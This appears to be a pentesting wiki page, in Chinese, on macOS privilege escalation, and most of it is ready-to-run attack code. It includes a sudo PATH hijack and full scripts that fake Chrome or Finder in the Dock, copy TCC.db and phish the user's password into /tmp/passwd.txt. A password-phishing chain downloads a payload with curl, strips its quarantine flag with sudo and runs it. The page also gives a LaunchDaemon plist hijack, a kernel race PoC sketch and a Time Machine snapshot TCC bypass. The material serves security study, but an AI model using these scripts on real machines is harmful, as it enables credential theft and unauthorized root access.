# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

如果你是来寻找 TCC privilege escalation，请前往：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

请注意，**大多数关于影响 Linux/Unix 的 privilege escalation 的技巧也同样适用于 MacOS** 机器。所以请参见：


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

你可以在原始的 [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) 中找到该技术。

然而，macOS 在用户执行 **`sudo`** 时会**保留**该用户的 **`PATH`**。这意味着实现该攻击的另一种方法是**hijack other binaries**，即劫持受害者在**running sudo** 时仍会执行的其他二进制文件：
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
请注意，使用终端的用户很可能已经安装了 **Homebrew**。因此可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。

### Dock 冒充

使用一些 **social engineering**，你可以在 Dock 中**冒充（例如 Google Chrome）**并实际执行你自己的脚本：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
一些建议：

- 检查 Dock 中是否有 Chrome，如果有，**移除**该条目并**添加** **假的** **Chrome 条目（在相同位置）**。

<details>
<summary>Chrome Dock 冒充脚本</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
一些建议：

- 你 **无法将 Finder 从 Dock 中移除**，所以如果你打算把它添加到 Dock，可以把假的 Finder 放在真实的旁边。为此你需要 **在 Dock 数组的开头添加假的 Finder 条目**。
- 另一种选择是不将它放入 Dock，仅打开它；“Finder 请求控制 Finder” 并不会显得很奇怪。
- 另一种办法是让 Finder 真正要求输入密码以执行特权操作，从而通过一个可怕的对话框实现 **escalate to root without asking**：
- 让 Finder 将一个新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（要求输入密码的提示会显示 “Finder wants to copy sudo”）
- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，因此要求密码的提示会显示 “Finder wants to copy Finder.bundle”）

<details>
<summary>Finder Dock 冒充脚本</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware 常常滥用用户交互来 **捕获一个可用于 sudo 的密码** 并以编程方式重用它。常见流程：

1. 使用 `whoami` 确认已登录用户。
2. **循环提示密码**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
3. 将凭证缓存（例如 `/tmp/.pass`），并使用 `sudo -S`（通过 stdin 提供密码）执行特权操作。

示例最小链：
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
窃取的密码随后可被重复使用，用于 **通过 `xattr -c` 清除 Gatekeeper 隔离**、复制 LaunchDaemons 或其他受权限保护的文件，并以非交互方式运行后续阶段。

## 更新的 macOS 特定 向量 (2023–2025)

### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可使用

`AuthorizationExecuteWithPrivileges` 在 10.7 中被弃用，但 **在 Sonoma/Sequoia 上仍然可用**。许多商业更新程序会用一个不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标二进制可被用户写入，你可以植入一个 trojan 并借用合法的提示：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
将其与 **masquerading tricks above** 结合，以展示一个可信的密码对话框。

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

如果 LaunchDaemon plist 或其 `ProgramArguments` 目标是 **user-writable**，你可以通过替换它然后强制 launchd 重新加载来提权：
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
这与为 **CVE-2025-24085** 发布的利用模式相似，其中滥用了可写的 plist 来以 root 身份执行攻击者代码。

### XNU SMR 凭证竞争 (CVE-2025-24118)

**在 `kauth_cred_proc_update` 中的竞争** 允许本地攻击者通过在多个线程中竞速 `setgid()`/`getgid()` 循环，直到发生撕裂的 `memcpy`，从而破坏只读凭证指针（`proc_ro.p_ucred`）。成功破坏会得到 **uid 0** 并获得内核内存访问。最小 PoC 结构：
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
与 heap grooming 配合，将受控数据放置在指针重新读取的位置。在易受影响的构建上，这是一个可靠的 **local kernel privesc**，无需绕过 SIP。

### 通过 Migration Assistant 绕过 SIP ("Migraine", CVE-2023-32369)

如果你已经获得 root 权限，SIP 仍然会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant 的 entitlement `com.apple.rootless.install.heritable` 来生成一个继承 SIP 绕过的子进程并覆盖受保护路径（例如 `/System/Library/LaunchDaemons`）。攻击链：

1. 在运行的系统上获得 root。
2. 通过构造的状态触发 `systemmigrationd` 以运行攻击者控制的二进制文件。
3. 使用继承的 entitlement 修补受 SIP 保护的文件，即使重启也能持久化。

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 漏洞类别)

多个 Apple 守护进程通过 XPC 接受 **NSPredicate** 对象，却只验证 `expressionType` 字段，而该字段可由攻击者控制。通过构造一个评估任意 selector 的 predicate，可以实现 **code execution in root/system XPC services**（例如 `coreduetd`、`contextstored`）。当与初始的 app sandbox escape 结合时，这会授予 **privilege escalation without user prompts**。寻找那些反序列化 predicates 且缺乏健壮 visitor 的 XPC endpoints。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（即使是无特权用户）都可以创建并挂载一个 Time Machine 快照，并**访问该快照的所有文件**。\\ **唯一需要的特权** 是用于执行操作的应用（例如 `Terminal`）被授予 **Full Disk Access (FDA)**（`kTCCServiceSystemPolicyAllfiles`），该权限需由管理员授予。

<details>
<summary>挂载 Time Machine 快照</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

更详细的说明可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## 敏感信息

这可能有助于提升权限：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## 参考资料

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
